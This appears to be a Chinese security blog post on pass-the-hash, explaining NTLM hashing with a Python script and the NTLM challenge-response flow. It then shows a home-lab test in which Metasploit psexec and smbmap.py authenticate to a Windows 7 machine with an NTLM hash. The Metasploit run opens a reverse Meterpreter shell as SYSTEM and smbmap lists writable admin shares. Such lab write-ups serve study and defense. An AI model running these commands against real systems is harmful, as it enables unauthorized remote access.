@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>hash传递攻击研究 | sh1yan&#39;blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="description" content="0x00 前言 记得还是在17年11月份的时候，ice老师当时在shepi群里分享了两个技巧，记忆最深的一句话是： “服务器密码解不出来，不用解了，用hash登录”，当时的自己还是停留在web的程度，没有过多的思考， 最近想起来了就研究一下为什么这么说。 0x01 NTLM-Hash 什么是ntlm-hash？">
+<meta name="keywords" content="hash">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hash传递攻击研究">
+<meta property="og:url" content="sh1yan.top/2019/05/19/Hash-Passing-Attack-explore/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 前言 记得还是在17年11月份的时候，ice老师当时在shepi群里分享了两个技巧，记忆最深的一句话是： “服务器密码解不出来，不用解了，用hash登录”，当时的自己还是停留在web的程度，没有过多的思考， 最近想起来了就研究一下为什么这么说。 0x01 NTLM-Hash 什么是ntlm-hash？">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://sh1yan.top\photo\Hash-Passing-Attack-explore\1.png">
+<meta property="og:updated_time" content="2019-05-19T06:53:35.617Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hash传递攻击研究">
+<meta name="twitter:description" content="0x00 前言 记得还是在17年11月份的时候，ice老师当时在shepi群里分享了两个技巧，记忆最深的一句话是： “服务器密码解不出来，不用解了，用hash登录”，当时的自己还是停留在web的程度，没有过多的思考， 最近想起来了就研究一下为什么这么说。 0x01 NTLM-Hash 什么是ntlm-hash？">
+<meta name="twitter:image" content="http://sh1yan.top\photo\Hash-Passing-Attack-explore\1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="sh1yan&#39;blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Inconsolata" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/gossip">Gossip</a>
+        
+          <a class="main-nav-link" href="/yqlj">Links</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="sh1yan.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Hash-Passing-Attack-explore" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/05/19/Hash-Passing-Attack-explore/" class="article-date">
+  <time datetime="2019-05-19T01:25:55.000Z" itemprop="datePublished">2019-05-19</time>
+</a>
+
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/漏洞研究/">漏洞研究</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      hash传递攻击研究
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <div class="article-sharing">
+  <ul>
+    <li>
+      <div class="fb-like" data-send="false" data-layout="button_count" data-show-faces="false" data-font="verdana" data-href="sh1yan.top/2019/05/19/Hash-Passing-Attack-explore/"></div>
+    </li>
+  </ul>
+</div>
+
+      
+      
+        
+        <p><strong>0x00 前言</strong></p>
+<p>记得还是在17年11月份的时候，ice老师当时在shepi群里分享了两个技巧，记忆最深的一句话是：</p>
+<p>“服务器密码解不出来，不用解了，用hash登录”，当时的自己还是停留在web的程度，没有过多的思考，</p>
+<p>最近想起来了就研究一下为什么这么说。</p>
+<p><strong>0x01 NTLM-Hash</strong></p>
+<p>什么是ntlm-hash？<br><a id="more"></a></p>
+<p>在Windows操作系统中，早期都是使用的LM-hash用于储存密码，但是因为LM使用了固定的key也就是<em>KGS!@#$%</em>，并且加密过程也存在一定的破解性，所以微软开发了ntlm-hash，用于替代lm-hash。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"></th>
+<th style="text-align:center">xp</th>
+<th style="text-align:center">2003</th>
+<th style="text-align:center">win7</th>
+<th style="text-align:center">2008</th>
+<th style="text-align:center">2012</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">LM-hash</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">NTLM-hash</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+</tr>
+</tbody>
+</table>
+<p>在win7、2008、2102等之后的系统中，均是采用了NTLM-hash进行储存密码。</p>
+<p>NTLM-HASH生成过程为：</p>
+<ol>
+<li>将输入的明文密码转换为十六进制字符串（转成hex格式）</li>
+<li>然后将十六进制字符串进行Unicode转换（每两个字符后添加00），但是数据格式为hex。</li>
+<li>将Unicode转换后的数据进行MD4加密，结果即为ntlm-hash值。</li>
+</ol>
+<p>转换为十六进制字符串 shiyan —-&gt; 73686979616e<br>转化为Unicode字符串 73686979616e —-&gt; 730068006900790061006e00<br>使用MD4消息摘要算法 730068006900790061006e00 —-&gt; c1028ef7ad02bf9c597916b67990f620</p>
+<p>下面是我写的小脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@author:shiyan</span></span><br><span class="line"><span class="string">@file:ntlm-hash-tool.py</span></span><br><span class="line"><span class="string">@time:2019/5/19</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NTLM_HASH</span><span class="params">(password)</span>:</span></span><br><span class="line">    password = password</span><br><span class="line">    hex1 = password.encode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="comment"># print hex1</span></span><br><span class="line">    unicode1=re.findall(<span class="string">r'.&#123;2&#125;'</span>,hex1)</span><br><span class="line">    unicode2=<span class="string">'00'</span>.join(unicode1)</span><br><span class="line">    unicode3 = unicode2 + <span class="string">'00'</span></span><br><span class="line">    <span class="comment"># print unicode3</span></span><br><span class="line">    unicode4 = binascii.a2b_hex(unicode3)</span><br><span class="line">    ntlm_hash = hashlib.new(<span class="string">'md4'</span>,unicode4).hexdigest()</span><br><span class="line">    <span class="keyword">print</span> ntlm_hash</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    a = <span class="string">'shiyan'</span></span><br><span class="line">    NTLM_HASH(a)</span><br></pre></td></tr></table></figure>
+<p><strong>0x02 Net-NTLM-Hash</strong></p>
+<p>net-ntlm-hash并不是一个标准的术语，它是指在NTLM认证中，进行效验对比的hash，这个hash值是在原有的ntlm-hash值行进行一定的算法产生。</p>
+<p>NTLM认证协议是NT LAN Manager的缩写，这也说明了协议的来源。NTLM 是 Windows NT 早期版本的标准安全协议，Windows 2000 支持 NTLM 是为了保持<a href="https://baike.baidu.com/item/%E5%90%91%E5%90%8E%E5%85%BC%E5%AE%B9/94553" target="_blank" rel="noopener">向后兼容</a>。Windows 2000内置三种基本安全协议之一。</p>
+<p>NTLM认证流程如下：</p>
+<ol>
+<li>Client 向 Server 发送一个请求，请求中带有明文的 username ，server会判断本地Sam是否存储请求中的账号信息。</li>
+<li>在Server接受到这个请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回Client。Server本身会使用请求中username在Server本地对应储存的ntlm-hash加密Challenge，获得Challenge1。</li>
+<li>Client接收到Challenge后，使用username所对应的password（此处的密码为ntlm-hash值）对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给Server。</li>
+<li>Server接收到Client发送的response后，会效验是否和本地生成的Challenge1一致，如果一致，则认证通过。</li>
+</ol>
+<p><strong>0x03 SMB中的hash传递</strong></p>
+<p>SMB可以直接基于TCP协议或者NetBIOS over TCP，SMB的认证可以基于SMB，也可以基于kerberos，，这两种认证方式，前者本质上使用了hash，后者本质上使用了ticket，导致了SMB的PtH和PtT攻击存在的基础。</p>
+<p><img src="http://sh1yan.top\photo\Hash-Passing-Attack-explore\1.png" alt></p>
+<p>目前常用的hash传递工具都是通过445端口进行攻击的，也是因为smb使用了ntml认证，所以导致可以hash传递。</p>
+<p><strong>0x04 hash传递本地测试</strong></p>
+<p>哈希传递攻击的适用场景为不知道账号明文密码的前提下， 进行渗透攻击。</p>
+<p>哈希传递的本质不算是一个漏洞，最多算是一个认证缺陷，或者也算不上。</p>
+<p>测试场景：</p>
+<p>攻击机：kali，192.168.3.121；win10，192.168.3.111。</p>
+<p>目标机：win7，192.168.3.123。</p>
+<p>工具：metasploit：psexec</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting  Required  Description</span><br><span class="line">   ----                  ---------------  --------  -----------</span><br><span class="line">   RHOSTS                                 yes       The target address range <span class="keyword">or</span> CIDR identifier</span><br><span class="line">   RPORT                 <span class="number">445</span>              yes       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                    no        Service description to to be used on target <span class="keyword">for</span> pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                   no        The service display name</span><br><span class="line">   SERVICE_NAME                           no        The service name</span><br><span class="line">   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) <span class="keyword">or</span> a normal read/write folder share</span><br><span class="line">   SMBDomain             .                no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                no        The username to authenticate <span class="keyword">as</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts <span class="number">192.168</span><span class="number">.3</span><span class="number">.123</span></span><br><span class="line">rhosts =&gt; 192.168.3.123</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbuser L</span><br><span class="line">smbuser =&gt; L</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbpass <span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">smbpass =&gt; 44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.3</span><span class="number">.121</span>:<span class="number">4444</span> </span><br><span class="line">[*] <span class="number">192.168</span><span class="number">.3</span><span class="number">.123</span>:<span class="number">445</span> - Connecting to the server...</span><br><span class="line">[*] <span class="number">192.168</span><span class="number">.3</span><span class="number">.123</span>:<span class="number">445</span> - Authenticating to <span class="number">192.168</span><span class="number">.3</span><span class="number">.123</span>:<span class="number">445</span> <span class="keyword">as</span> user <span class="string">'L'</span>...</span><br><span class="line">[*] <span class="number">192.168</span><span class="number">.3</span><span class="number">.123</span>:<span class="number">445</span> - Selecting PowerShell target</span><br><span class="line">[*] <span class="number">192.168</span><span class="number">.3</span><span class="number">.123</span>:<span class="number">445</span> - Executing the payload...</span><br><span class="line">[+] <span class="number">192.168</span><span class="number">.3</span><span class="number">.123</span>:<span class="number">445</span> - Service start timed out, OK <span class="keyword">if</span> running a command <span class="keyword">or</span> non-service executable...</span><br><span class="line">[*] Sending stage (<span class="number">179779</span> bytes) to <span class="number">192.168</span><span class="number">.3</span><span class="number">.123</span></span><br><span class="line">[*] Meterpreter session 1 opened (192.168.3.121:4444 -&gt; 192.168.3.123:1264) at 2019-05-14 09:56:43 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process <span class="number">4608</span> created.</span><br><span class="line">Channel <span class="number">1</span> created.</span><br><span class="line">Microsoft Windows [�汾 <span class="number">6.1</span><span class="number">.7601</span>]</span><br><span class="line">��Ȩ���� (c) <span class="number">2009</span> Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP ����</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">��̫�������� ��������:</span><br><span class="line"></span><br><span class="line">   �����ض��� DNS ��׺ . . . . . . . : </span><br><span class="line">   IPv4 ��ַ . . . . . . . . . . . . : <span class="number">192.168</span><span class="number">.3</span><span class="number">.123</span></span><br><span class="line">   ��������  . . . . . . . . . . . . : <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">   Ĭ������. . . . . . . . . . . . . : <span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">���������� isatap.&#123;A3A2D3C1<span class="number">-50</span>F0<span class="number">-4</span>F78<span class="number">-94</span>F2<span class="number">-89</span>A05E10AE08&#125;:</span><br><span class="line"></span><br><span class="line">   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�</span><br><span class="line">   �����ض��� DNS ��׺ . . . . . . . : </span><br><span class="line"></span><br><span class="line">���������� ��������* <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�</span><br><span class="line">   �����ض��� DNS ��׺ . . . . . . . : </span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>
+<p>工具：smbmap.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">F:\smbmap&gt;python2 smbmap.py -u <span class="string">"L"</span> -p <span class="string">"44EFCE164AB921CAAAD3B435B51404EE:</span></span><br><span class="line"><span class="string">32ED87BDB5FDC5E9CBA88547376818D4"</span> -H <span class="number">192.168</span><span class="number">.3</span><span class="number">.123</span></span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] Hash detected, using <span class="keyword">pass</span>-the-hash to authentiate</span><br><span class="line">[+] User session establishd on <span class="number">192.168</span><span class="number">.3</span><span class="number">.123</span>...</span><br><span class="line">[+] IP: <span class="number">192.168</span><span class="number">.3</span><span class="number">.123</span>:<span class="number">445</span>       Name: L-PC</span><br><span class="line">        Disk                                                    Permissions</span><br><span class="line">        ----                                                    -----------</span><br><span class="line">        ADMIN$                                                  READ, WRITE</span><br><span class="line">        C$                                                      READ, WRITE</span><br><span class="line">        HP Universal Printing PCL <span class="number">5</span>                             NO ACCESS</span><br><span class="line">        IPC$                                                    NO ACCESS</span><br><span class="line">        <span class="keyword">print</span>$                                                  READ, WRITE</span><br><span class="line">        Users                                                   READ, WRITE</span><br><span class="line"></span><br><span class="line">F:\smbmap&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>0x05 番外</strong></p>
+<p>本地2003,2008各种传递失败，然后我各种配置啊，各种调试，尤其是2003，各种配置完还是不行，提示各种错误，如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">E:\python2 run.py</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] Hash detected, using <span class="keyword">pass</span>-the-hash to authentiate</span><br><span class="line">[!] Authentication error occured</span><br><span class="line">[!] SMB SessionError: STATUS_ACCOUNT_RESTRICTION(Indicates a referenced user name <span class="keyword">and</span> authentication information are val</span><br><span class="line">id, but some user account restriction has prevented successful authentication (such <span class="keyword">as</span> time-of-day restrictions).)</span><br><span class="line">[!] Authentication error on <span class="number">192.168</span><span class="number">.43</span><span class="number">.145</span></span><br><span class="line"></span><br><span class="line">E:\python2 run.py</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[!] Authentication error occured</span><br><span class="line">[!] The NETBIOS connection <span class="keyword">with</span> the remote host timed out.</span><br><span class="line">[!] Authentication error on <span class="number">192.168</span><span class="number">.3</span><span class="number">.119</span></span><br></pre></td></tr></table></figure>
+<p>说多了都是泪。。。。</p>
+<p><strong>0x06 参考链接</strong></p>
+<p><a href="http://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">http://payloads.online/archivers/2018-11-30/1</a></p>
+<p><a href="https://www.cnblogs.com/KevinGeorge/p/9508820.html" target="_blank" rel="noopener">https://www.cnblogs.com/KevinGeorge/p/9508820.html</a></p>
+<p><a href="https://www.freebuf.com/articles/terminal/80186.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/terminal/80186.html</a></p>
+<p><a href="https://www.cnblogs.com/KevinGeorge/p/9455196.html" target="_blank" rel="noopener">https://www.cnblogs.com/KevinGeorge/p/9455196.html</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/</a></p>
+
+      
+      
+        
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="sh1yan.top/2019/05/19/Hash-Passing-Attack-explore/" data-id="cl64hepdw000kasw1c1u6b5st" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hash/">hash</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-about" class="widget-title">About</h3>
+    <div class="widget">
+
+<!-- 优美的分割线 -->
+
+    <div style="width:249px;height:190px;border:1px none ;text-align:center">
+  <img src="//sh1yan.top/icon.png" alt="shiyan" style="width:190px;height:190px;display:inline-block;margin:0 auto">
+  </div>
+<br>
+
+
+<p style="font-size:15px">ID：shiyan</p>
+<p style="font-size:14px">个人简介：会开挖挖机的园工~</p>
+<p style="font-size:14px">
+<a href="mailto:506130869@qq.com">Email：506130869@qq.com</a><br>
+<a href="https://github.com/shiyan-520">GitHub：https://github.com/shiyan-520</a>
+</p>
+
+
+<!-- 优美的分割线 -->
+
+      
+      
+      <p></p>
+      
+      
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-tagcloud" class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/ByPass-UAC/" style="font-size: 10px;">ByPass-UAC</a> <a href="/tags/CMS/" style="font-size: 13.33px;">CMS</a> <a href="/tags/COM组件劫持/" style="font-size: 10px;">COM组件劫持</a> <a href="/tags/Cobalt-Strike/" style="font-size: 10px;">Cobalt Strike</a> <a href="/tags/DLL劫持/" style="font-size: 10px;">DLL劫持</a> <a href="/tags/Excel/" style="font-size: 13.33px;">Excel</a> <a href="/tags/JavaWeb/" style="font-size: 20px;">JavaWeb</a> <a href="/tags/Kerberos认证/" style="font-size: 10px;">Kerberos认证</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/PHP/" style="font-size: 13.33px;">PHP</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Python3/" style="font-size: 10px;">Python3</a> <a href="/tags/Rmi协议/" style="font-size: 10px;">Rmi协议</a> <a href="/tags/SMBMS/" style="font-size: 10px;">SMBMS</a> <a href="/tags/UAC/" style="font-size: 10px;">UAC</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/access-token/" style="font-size: 10px;">access token</a> <a href="/tags/burp/" style="font-size: 16.67px;">burp</a> <a href="/tags/hash/" style="font-size: 10px;">hash</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/jsonp/" style="font-size: 10px;">jsonp</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/mybatis/" style="font-size: 10px;">mybatis</a> <a href="/tags/mysql/" style="font-size: 13.33px;">mysql</a> <a href="/tags/pandas/" style="font-size: 10px;">pandas</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/spring5/" style="font-size: 10px;">spring5</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/vba/" style="font-size: 13.33px;">vba</a> <a href="/tags/web漏洞/" style="font-size: 13.33px;">web漏洞</a> <a href="/tags/令牌伪造/" style="font-size: 10px;">令牌伪造</a> <a href="/tags/动态代理/" style="font-size: 10px;">动态代理</a> <a href="/tags/博客源码/" style="font-size: 10px;">博客源码</a> <a href="/tags/博客问题解决/" style="font-size: 10px;">博客问题解决</a> <a href="/tags/反射/" style="font-size: 10px;">反射</a> <a href="/tags/域渗透/" style="font-size: 10px;">域渗透</a> <a href="/tags/学习笔记/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/安全审计/" style="font-size: 13.33px;">安全审计</a> <a href="/tags/安全服务/" style="font-size: 10px;">安全服务</a> <a href="/tags/工具分析/" style="font-size: 10px;">工具分析</a> <a href="/tags/序列化/" style="font-size: 10px;">序列化</a> <a href="/tags/报错注入/" style="font-size: 10px;">报错注入</a> <a href="/tags/漏洞复现/" style="font-size: 10px;">漏洞复现</a> <a href="/tags/生活记录/" style="font-size: 10px;">生活记录</a> <a href="/tags/端口转发/" style="font-size: 10px;">端口转发</a> <a href="/tags/脚本编写/" style="font-size: 10px;">脚本编写</a> <a href="/tags/部署上线/" style="font-size: 10px;">部署上线</a>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-recent-posts" class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/03/20/Mybatis-3-learning-notes/">mybatis-3学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/02/Spring-5-learning-notes/">Spring5学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/18/An-audit-of-Java-Web-smbms/">记一次对JavaWeb-SMBMS的审计</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/18/Java-RMI-protocol-learning/">Java Rmi协议学习</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/13/Java-Dynamic-agent-mode/">Java动态代理模式</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+    不要因为走了太久而忘记当初为什么出发。
+    <br>
+    Copyrights &copy; 2022 shiyan All Rights Reserved. 
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_uv"> 
+    <a>「</a>本站访客数<span id="busuanzi_value_site_uv"></span>人次<a>」</a>
+    </span></div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/gossip" class="mobile-nav-link">Gossip</a>
+  
+    <a href="/yqlj" class="mobile-nav-link">Links</a>
+  
+</nav>
+
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/ja_JP/sdk.js#xfbml=1&version=v2.4";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+<script src="/js/script.js"></script>
+
+
+  </div>
+</body>
+</html>
